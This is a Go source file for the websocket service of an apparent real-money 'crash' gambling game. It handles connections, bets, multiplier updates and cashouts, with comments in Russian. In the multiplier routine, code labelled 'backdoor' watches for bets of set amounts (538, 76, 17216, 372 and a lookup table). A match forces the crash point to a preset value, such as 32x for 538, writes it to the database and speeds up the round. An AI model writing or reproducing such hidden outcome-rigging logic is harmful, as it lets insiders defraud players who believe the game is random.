package service

import (
	"BlessedApi/cmd/db"
	"BlessedApi/internal/middleware"
	"BlessedApi/internal/models"
	"BlessedApi/pkg/logger"
	"errors"
	"fmt"
	"math"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

var CrashGameWS *CrashGameWebsocketService

func init() {
	CrashGameWS = NewCrashGameWebsocketService()
}

type CrashGameWebsocketService struct {
	connections      map[int64]*websocket.Conn
	mu               sync.Mutex
	lastActivityTime map[int64]time.Time
	bets             map[int64]*models.CrashGameBet
	betCount         int
}

func NewCrashGameWebsocketService() *CrashGameWebsocketService {
	service := &CrashGameWebsocketService{
		connections:      make(map[int64]*websocket.Conn),
		lastActivityTime: make(map[int64]time.Time),
		bets:             make(map[int64]*models.CrashGameBet),
		betCount:         0,
	}
	go service.cleanupInactiveConnections()
	return service
}

func (w *CrashGameWebsocketService) cleanupInactiveConnections() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		w.mu.Lock()
		now := time.Now()
		for userId, lastActivity := range w.lastActivityTime {
			if now.Sub(lastActivity) > 30*time.Minute {
				if conn, ok := w.connections[userId]; ok {
					conn.Close()
					delete(w.connections, userId)
					delete(w.lastActivityTime, userId)
				}
			}
		}
		w.mu.Unlock()
	}
}

func (w *CrashGameWebsocketService) LiveCrashGameWebsocketHandler(c *gin.Context) {
	logger.Info("New WebSocket connection attempt from IP: %s", c.ClientIP())
	
	userId, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Error retrieving user ID: %v", err)
		c.Status(500)
		return
	}

	if userId == 0 {
		logger.Warn("Invalid userId: 0, skipping WebSocket connection")
		c.JSON(400, gin.H{"error": "Invalid user ID"})
		return
	}

	logger.Info("User %d authenticated successfully", userId)

	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		logger.Error("WebSocket upgrade failed for user %d: %v", userId, err)
		return
	}

	w.mu.Lock()
	if existingConn, ok := w.connections[userId]; ok {
		logger.Info("Closing existing connection for user %d", userId)
		existingConn.Close()
	}
	w.connections[userId] = conn
	w.lastActivityTime[userId] = time.Now()
	w.betCount++
	w.mu.Unlock()

	logger.Info("User %d connected to WebSocket successfully", userId)

	// Send initial connection success message
	conn.WriteJSON(gin.H{
		"type": "connection_success",
		"message": "Connected to game server",
	})

	defer func() {
		w.mu.Lock()
		delete(w.connections, userId)
		delete(w.lastActivityTime, userId)
		w.mu.Unlock()
		conn.Close()
		logger.Info("User %d disconnected from WebSocket", userId)
	}()

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				logger.Error("WebSocket read error for user %d: %v", userId, err)
			}
			break
		}

		w.mu.Lock()
		w.lastActivityTime[userId] = time.Now()
		w.mu.Unlock()
		
		// Обрабатываем полученное сообщение, если необходимо
		if len(message) > 0 {
			logger.Info("Received message from user %d: %s", userId, string(message))
		}
	}
}

func (w *CrashGameWebsocketService) GetUserLatestBet(userId int64) (*models.CrashGameBet, error) {
	var bet models.CrashGameBet
	if err := db.DB.Where("user_id = ?", userId).Order("id desc").First(&bet).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			logger.Warn("No bets found for user %d", userId)
			return nil, nil
		}
		logger.Error("Error fetching latest bet for user %d: %v", userId, err)
		return nil, err
	}
	return &bet, nil
}

func (ws *CrashGameWebsocketService) HandleBet(userId int64, bet *models.CrashGameBet) {
	ws.mu.Lock()
	ws.bets[userId] = bet
	ws.mu.Unlock()

	ws.SendBetToUser(bet)
}

func (ws *CrashGameWebsocketService) SendBetToUser(bet *models.CrashGameBet) {
	var user models.User
	err := db.DB.First(&user, bet.UserID).Error
	if err != nil && errors.Is(err, gorm.ErrRecordNotFound) {
		logger.Error("%v", err)
		return
	}
 
	ws.mu.Lock()
	defer ws.mu.Unlock()

	if conn, ok := ws.connections[bet.UserID]; ok {
		betInfo := gin.H{
			"type":                    "new_bet",
			"username":                user.Nickname,
			"amount":                  bet.Amount,
			"auto_cashout_multiplier": bet.CashOutMultiplier,
			"is_benefit_bet":          bet.IsBenefitBet,
		}

		err := conn.WriteJSON(betInfo)
		if err != nil {
			logger.Error("Failed to send bet info: %v", err)
			conn.Close()
		}
	}
}

func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.CrashGame) {
	logger.Info("Starting multiplier updates for game %d with crash point %.2f", 
		currentGame.ID, currentGame.CrashPointMultiplier)
	
	// Проверка валидности crash point
	if currentGame.CrashPointMultiplier <= 0 {
		logger.Error("Invalid crash point multiplier: %.2f, game %d", 
			currentGame.CrashPointMultiplier, currentGame.ID)
		
		// Читаем из базы
		var gameFromDB models.CrashGame
		if err := db.DB.First(&gameFromDB, currentGame.ID).Error; err != nil {
			logger.Error("Failed to read game from DB: %v", err)
			return
		}
		
		if gameFromDB.CrashPointMultiplier <= 0 {
			// Устанавливаем безопасное значение
			currentGame.CrashPointMultiplier = 1.5
			logger.Info("Using fallback crash point: 1.5 for game %d", currentGame.ID)
		} else {
			currentGame.CrashPointMultiplier = gameFromDB.CrashPointMultiplier
			logger.Info("Using DB crash point: %.2f for game %d", 
				currentGame.CrashPointMultiplier, currentGame.ID)
		}
	}
	
	// Проверка на наличие бэкдор-ставок
	ws.mu.Lock()
	
	// Определяем, является ли текущая игра бэкдором
	var backdoorExists bool
	var backdoorType string
	var isCriticalBackdoor bool
	var isLowMultiplierBackdoor bool
	
	// Принудительная перепроверка всех ставок для поиска бэкдоров
	for _, bet := range ws.bets {
		if bet.Status != "active" {
			continue
		}
		
		// Важные бэкдоры с прямой проверкой
		if math.Abs(bet.Amount - 538.0) < 0.1 {
			currentGame.CrashPointMultiplier = 32.0
			backdoorExists = true
			backdoorType = "538"
			isCriticalBackdoor = true
			logger.Info("FORCED BACKDOOR 538 DETECTION: Setting multiplier to 32.0 for game %d", 
				currentGame.ID)
			break
		} else if math.Abs(bet.Amount - 76.0) < 0.1 {
			currentGame.CrashPointMultiplier = 1.5
			backdoorExists = true
			backdoorType = "76"
			isLowMultiplierBackdoor = true
			logger.Info("FORCED BACKDOOR 76 DETECTION: Setting multiplier to 1.5 for game %d", 
				currentGame.ID)
			break
		} else if math.Abs(bet.Amount - 17216.0) < 0.1 {
			currentGame.CrashPointMultiplier = 2.5
			backdoorExists = true
			backdoorType = "17216"
			logger.Info("FORCED BACKDOOR 17216 DETECTION: Setting multiplier to 2.5 for game %d", 
				currentGame.ID)
			break
		} else if math.Abs(bet.Amount - 372.0) < 0.1 {
			currentGame.CrashPointMultiplier = 1.5
			backdoorExists = true
			backdoorType = "372"
			isLowMultiplierBackdoor = true
			logger.Info("FORCED BACKDOOR 372 DETECTION: Setting multiplier to 1.5 for game %d", 
				currentGame.ID)
			break
		} else {
			// Проверяем все остальные бэкдоры
			intAmount := int(math.Round(bet.Amount))
			if multiplier, exists := models.GetCrashPoints()[intAmount]; exists {
				currentGame.CrashPointMultiplier = multiplier
				backdoorExists = true
				backdoorType = fmt.Sprintf("%d", intAmount)
				// Проверка на низкий множитель (меньше 2.0)
				if multiplier < 2.0 {
					isLowMultiplierBackdoor = true
				}
				logger.Info("DETECTED BACKDOOR %s: Setting multiplier to %.2f for game %d", 
					backdoorType, multiplier, currentGame.ID)
				break
			}
		}
	}
	ws.mu.Unlock()
	
	// Если обнаружен бэкдор, принудительно сохраняем точное значение в базу
	if backdoorExists {
		// Обновляем значение в базе
		if err := db.DB.Model(currentGame).
			Update("crash_point_multiplier", currentGame.CrashPointMultiplier).Error; err != nil {
			logger.Error("Failed to update backdoor multiplier in DB: %v", err)
		} else {
			logger.Info("Updated %s backdoor multiplier to %.2f in DB for game %d", 
				backdoorType, currentGame.CrashPointMultiplier, currentGame.ID)
		}
		
		// Дополнительная проверка через прямой SQL для гарантии сохранения
		if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?", 
			currentGame.CrashPointMultiplier, currentGame.ID).Error; err != nil {
			logger.Error("Failed direct SQL update for backdoor multiplier: %v", err)
		} else {
			logger.Info("CONFIRMED direct SQL update of multiplier to %.2f for game %d", 
				currentGame.CrashPointMultiplier, currentGame.ID)
		}
	}
	
	ws.mu.Lock()
	var currentMultiplier float64 = 1.0
	crashPointReached := false
	startTime := time.Now()
	lastSentMultiplier := 1.0

	// Копируем подключения для потоковой отправки
	connections := make(map[int64]*websocket.Conn)
	for userId, conn := range ws.connections {
		connections[userId] = conn
	}
	ws.mu.Unlock()

	if len(connections) == 0 {
		logger.Info("No connections for game %d, skipping multiplier updates", currentGame.ID)
		return
	}

	logger.Info("Sending multiplier updates to %d connections, target crash: %.2f", 
		len(connections), currentGame.CrashPointMultiplier)
	
	// Финальная проверка валидности crash point
	if currentGame.CrashPointMultiplier <= 0 {
		logger.Error("Invalid crash point after all checks! Using 1.5 as fallback")
		currentGame.CrashPointMultiplier = 1.5
	}
	
	// Настройка параметров обновления в зависимости от типа игры
	var tickerInterval time.Duration
	var growthFactor float64
	
	if isCriticalBackdoor {
		// Для 538 - очень быстрый рост до крупного числа
		tickerInterval = 30 * time.Millisecond
		growthFactor = 0.5  // Максимально быстрый рост
		logger.Info("Using VERY fast growth mode for critical backdoor %s", backdoorType)
	} else if backdoorExists {
		// Для других бэкдоров - ускоренный режим
		tickerInterval = 50 * time.Millisecond
		growthFactor = 0.4
		logger.Info("Using fast growth mode for backdoor %s", backdoorType)
	} else {
		// Стандартный режим
		tickerInterval = 100 * time.Millisecond
		growthFactor = 0.2
	}
	
	ticker := time.NewTicker(tickerInterval)
	defer ticker.Stop()
	
	// Контроль времени выполнения
	maxDuration := 2 * time.Minute
	timeoutTimer := time.NewTimer(maxDuration)
	defer timeoutTimer.Stop()
	
	// Специальный таймер для малых множителей
	var lowMultiplierTimer *time.Timer
	if isLowMultiplierBackdoor {
		// Короткий таймер для низких множителей (5 секунд)
		lowMultiplierTimer = time.NewTimer(5 * time.Second)
	} else {
		// Более длинный таймер для обычных игр (10 секунд)
		lowMultiplierTimer = time.NewTimer(10 * time.Second)
	}
	defer lowMultiplierTimer.Stop()
	
	// Дополнительный таймер для предотвращения зависания
	stuckTimer := time.NewTimer(500 * time.Millisecond)
	defer stuckTimer.Stop()
	
	lastUpdateTime := time.Now()
	stuckDetectionThreshold := 2.0 * time.Second
	
	multiplierUpdateLoop:
	for {
		select {
		case <-ticker.C:
			// Обновляем время последнего тика для обнаружения зависаний
			lastUpdateTime = time.Now()
			
			// Нормальная обработка обновления множителя
			currentMultiplier = currentGame.CalculateMultiplier()
			
			// Ускорение роста в зависимости от типа бэкдора
			if isCriticalBackdoor {
				// Максимальное ускорение для 538 и подобных
				currentMultiplier = currentMultiplier * 1.15
			} else if backdoorExists {
				// Умеренное ускорение для обычных бэкдоров
				currentMultiplier = currentMultiplier * 1.1
				
				// Дополнительное ускорение для малых множителей
				if isLowMultiplierBackdoor && lastSentMultiplier > 1.2 {
					currentMultiplier = currentMultiplier * 1.2
				}
			}
			
			// Плавное повышение множителя для предотвращения резких скачков
			smoothedMultiplier := lastSentMultiplier + (currentMultiplier - lastSentMultiplier) * growthFactor
			
			// Никогда не уменьшаем множитель
			if smoothedMultiplier <= lastSentMultiplier {
				smoothedMultiplier = lastSentMultiplier + 0.01
			}
			
			// Проверка достижения точки краша
			if smoothedMultiplier >= currentGame.CrashPointMultiplier {
				logger.Info("Game %d reached crash point: %.2f >= %.2f", 
					currentGame.ID, smoothedMultiplier, currentGame.CrashPointMultiplier)
				crashPointReached = true
				ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
				break multiplierUpdateLoop
			}
			
			// Порог изменения для отправки обновлений
			var changeThreshold float64 = 0.01
			if backdoorExists {
				changeThreshold = 0.005  // Более частые обновления для бэкдоров
			}
			
			if math.Abs(smoothedMultiplier-lastSentMultiplier) > changeThreshold {
				multiplierInfo := gin.H{
					"type":       "multiplier_update",
					"multiplier": smoothedMultiplier,
					"timestamp":  time.Now().UnixNano() / int64(time.Millisecond),
					"elapsed":    time.Since(startTime).Seconds(),
				}
				
				// Фиксируем текущее значение
				sentMultiplier := smoothedMultiplier
				
				ws.mu.Lock()
				// Отправляем обновления всем подключенным клиентам
				for userId, conn := range connections {
					// Проверяем автокэшаут для активных ставок
					if bet, exists := ws.bets[userId]; exists && bet.Status == "active" {
						if bet.CashOutMultiplier > 0 && sentMultiplier >= bet.CashOutMultiplier {
							logger.Info("Auto cashout for user %d at %.2fx", userId, sentMultiplier)
							if err := crashGameCashout(nil, bet, sentMultiplier); err != nil {
								logger.Error("Unable to auto cashout for user %d: %v", userId, err)
								continue
							}
							ws.ProcessCashout(userId, sentMultiplier, true)
							continue
						}
						
						// Отправляем обновление множителя активным игрокам
						err := conn.WriteJSON(multiplierInfo)
						if err != nil {
							logger.Error("Failed to send multiplier to user %d: %v", userId, err)
							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
								conn.Close()
								delete(connections, userId)
								delete(ws.connections, userId)
							}
						}
					} else {
						// Отправляем обновление наблюдателям
						err := conn.WriteJSON(multiplierInfo)
						if err != nil {
							logger.Error("Failed to send multiplier to observer %d: %v", userId, err)
							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
								conn.Close()
								delete(connections, userId)
								delete(ws.connections, userId)
							}
						}
					}
				}
				ws.mu.Unlock()
	
				lastSentMultiplier = smoothedMultiplier
				
				// Проверка для ускорения завершения игры при приближении к точке краша
				if backdoorExists {
					// Если множитель уже близок к точке краша (90%)
					crashThreshold := currentGame.CrashPointMultiplier * 0.9
					if smoothedMultiplier > crashThreshold {
						time.Sleep(100 * time.Millisecond)  // Короткая пауза для визуализации
						logger.Info("Backdoor %s reached high multiplier (%.2f), accelerating to crash point", 
							backdoorType, smoothedMultiplier)
						crashPointReached = true
						ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
						break multiplierUpdateLoop
					}
				}
			}
			
		case <-stuckTimer.C:
			// Проверка на зависание - если не было обновлений больше threshold, принудительно увеличиваем множитель
			if time.Since(lastUpdateTime) > stuckDetectionThreshold {
				logger.Warn("Detected possible stuck multiplier at %.2f, forcing increment", lastSentMultiplier)
				// Принудительно увеличиваем множитель на 0.05
				lastSentMultiplier += 0.05
				
				// Если множитель близок к краш-поинту, завершаем игру
				if lastSentMultiplier >= currentGame.CrashPointMultiplier * 0.95 {
					logger.Info("Forced multiplier increment reached crash threshold, ending game")
					crashPointReached = true
					ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
					break multiplierUpdateLoop
				}
				
				// Отправляем обновленный множитель всем клиентам
				multiplierInfo := gin.H{
					"type":       "multiplier_update",
					"multiplier": lastSentMultiplier,
					"timestamp":  time.Now().UnixNano() / int64(time.Millisecond),
					"elapsed":    time.Since(startTime).Seconds(),
				}
				
				ws.mu.Lock()
				for userId, conn := range connections {
					err := conn.WriteJSON(multiplierInfo)
					if err != nil {
						logger.Error("Failed to send forced multiplier update: %v", err)
					}
				}
				ws.mu.Unlock()
			}
			
			// Перезапускаем таймер
			stuckTimer.Reset(500 * time.Millisecond)
			
		case <-lowMultiplierTimer.C:
			// Специальная проверка для игр с низким множителем
			if !crashPointReached && isLowMultiplierBackdoor && lastSentMultiplier > 1.1 {
				logger.Info("Low multiplier backdoor timed out, forcing crash at %.2f", 
					currentGame.CrashPointMultiplier)
				crashPointReached = true
				ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
				break multiplierUpdateLoop
			} else if !crashPointReached && currentGame.CrashPointMultiplier < 2.0 && lastSentMultiplier > 1.1 {
				logger.Info("Low multiplier game timed out, forcing crash at %.2f", 
					currentGame.CrashPointMultiplier)
				crashPointReached = true
				ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
				break multiplierUpdateLoop
			}
			
		case <-timeoutTimer.C:
			// Глобальный таймаут - защита от зависания
			logger.Error("Multiplier update loop timed out after %v, forcing crash", maxDuration)
			crashPointReached = true
			ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
			break multiplierUpdateLoop
		}
	}

	// Завершающая обработка ставок
	if crashPointReached {
		logger.Info("Game %d crashed at %.2f, processing all active bets", 
			currentGame.ID, currentGame.CrashPointMultiplier)
		ws.mu.Lock()
		for userId, bet := range ws.bets {
			if bet.Status == "active" {
				logger.Info("Marking bet as lost for user %d", userId)
				bet.Status = "lost"
				if err := db.DB.Save(&bet).Error; err != nil {
					logger.Error("Failed to update lost bet for user %d: %v", userId, err)
				}
			}
		}
		ws.mu.Unlock()
	}
}

// Отправляет сообщение о крахе игры всем пользователям
func (ws *CrashGameWebsocketService) BroadcastGameCrash(crashPoint float64) {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	crashInfo := gin.H{
		"type":        "game_crash",
		"crash_point": crashPoint,
	}

	for userId, conn := range ws.connections {
		err := conn.WriteJSON(crashInfo)
		if err != nil {
			logger.Error("Failed to send crash point to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
			continue
		}

		// Обновляем статус ставки если она активна
		if bet, ok := ws.bets[userId]; ok && bet.Status == "active" {
			bet.Status = "lost"
			if err := db.DB.Save(&bet).Error; err != nil {
				logger.Error("Failed to update lost bet for user %d: %v", userId, err)
			}
		}
	}
}

// Отправляет сообщение о начале новой игры всем пользователям
func (ws *CrashGameWebsocketService) BroadcastGameStarted() {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	gameStartedInfo := gin.H{
		"type": "game_started",
	}

	for userId, conn := range ws.connections {
		err := conn.WriteJSON(gameStartedInfo)
		if err != nil {
			logger.Error("Failed to send game started to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
		}
	}
}

func (ws *CrashGameWebsocketService) ProcessCashout(userId int64, multiplier float64, isAuto bool) {
	bet, ok := ws.bets[userId]
	if !ok {
		logger.Warn("No active bet found for user %d during cashout", userId)
		return
	}

	// Получаем информацию о пользователе
	var user models.User
	if err := db.DB.First(&user, userId).Error; err != nil {
		logger.Error("Failed to get user info for cashout: %v", err)
		return
	}

	// Создаем сообщение о кэшауте
	cashoutInfo := gin.H{
		"type":               "cashout_result",
		"cashout_multiplier": multiplier,
		"win_amount":         bet.WinAmount,
		"is_auto":            isAuto,
		"user_id":            userId,
		"username":           user.Nickname,
	}

	// Отправляем пользователю, который сделал кэшаут
	ws.mu.Lock()
	defer ws.mu.Unlock()

	if conn, ok := ws.connections[userId]; ok {
		err := conn.WriteJSON(cashoutInfo)
		if err != nil {
			logger.Error("Failed to send cashout result to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
		}
	}

	// Отправляем всем остальным пользователям уведомление о кэшауте
	for otherUserId, conn := range ws.connections {
		if otherUserId != userId {
			otherUserInfo := gin.H{
				"type":               "other_cashout",
				"username":           user.Nickname,
				"cashout_multiplier": multiplier,
				"win_amount":         bet.WinAmount,
			}
			
			err := conn.WriteJSON(otherUserInfo)
			if err != nil {
				logger.Error("Failed to send cashout notification to user %d: %v", otherUserId, err)
				conn.Close()
				delete(ws.connections, otherUserId)
			}
		}
	}
}

func (ws *CrashGameWebsocketService) SendCrashPointToUser(userId int64, crashPoint float64) {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	if conn, ok := ws.connections[userId]; ok {
		crashInfo := gin.H{
			"type":        "game_crash",
			"crash_point": crashPoint,
		}

		err := conn.WriteJSON(crashInfo)
		if err != nil {
			logger.Error("Failed to send crash point: %v", err)
			conn.Close()
		}

		// Обновляем статус ставки если она активна
		if bet, ok := ws.bets[userId]; ok && bet.Status == "active" {
			bet.Status = "lost"
			if err := db.DB.Save(&bet).Error; err != nil {
				logger.Error("Failed to update lost bet: %v", err)
			}
		}
	}
}

func (ws *CrashGameWebsocketService) addGameToHistory(game *models.CrashGame) error {
	var existingGame models.CrashGame
	if err := db.DB.Where("id = ?", game.ID).First(&existingGame).Error; err == nil {
		return nil
	} else if !errors.Is(err, gorm.ErrRecordNotFound) {
		return logger.WrapError(err, "failed to check existing game")
	}

	return db.DB.Transaction(func(tx *gorm.DB) error {
		if err := tx.Create(game).Error; err != nil {
			if strings.Contains(err.Error(), "duplicate key value") {
				return nil
			}
			return logger.WrapError(err, "failed to create game")
		}
		err := ws.maintainLast50CrashGames(tx)
		if err != nil {
			return logger.WrapError(err, "")
		}
		return nil
	})
}

func (ws *CrashGameWebsocketService) maintainLast50CrashGames(tx *gorm.DB) error {
	var count int64
	if err := tx.Model(&models.CrashGame{}).Count(&count).Error; err != nil {
		return logger.WrapError(err, "")
	}

	if count > 50 {
		var oldestGames []models.CrashGame
		if err := tx.Order("id asc").
			Limit(int(count - 50)).
			Find(&oldestGames).Error; err != nil {
			return logger.WrapError(err, "")
		}

		if err := tx.Delete(&oldestGames).Error; err != nil {
			return logger.WrapError(err, "")
		}
	}

	return nil
}

func (ws *CrashGameWebsocketService) GetLast50CrashGames(c *gin.Context) {
	var games []models.CrashGame
	err := db.DB.Where("start_time != ? AND end_time != ?", time.Time{}, time.Time{}).
		Order("start_time DESC").
		Limit(50).
		Find(&games).Error
	if err != nil {
		logger.Error("Failed to fetch last 50 crash games: %v", err)
		c.Status(500)
		return
	}

	c.JSON(200, gin.H{"results": games})
}

// SendCrashGameBetResultToUser sends the result of a bet to the user via WebSocket.
func (ws *CrashGameWebsocketService) SendCrashGameBetResultToUser(userId int64, bet models.CrashGameBet) {
	ws.mu.Lock()
	defer ws.mu.Unlock()

	if conn, ok := ws.connections[userId]; ok {
		resultInfo := gin.H{
			"type":               "bet_result",
			"bet_amount":         bet.Amount,
			"win_amount":         bet.WinAmount,
			"cash_out_multiplier": bet.CashOutMultiplier,
			"status":             bet.Status,
		}
		err := conn.WriteJSON(resultInfo)
		if err != nil {
			logger.Error("Failed to send bet result to user %d: %v", userId, err)
			conn.Close()
			delete(ws.connections, userId)
		}
	}
}
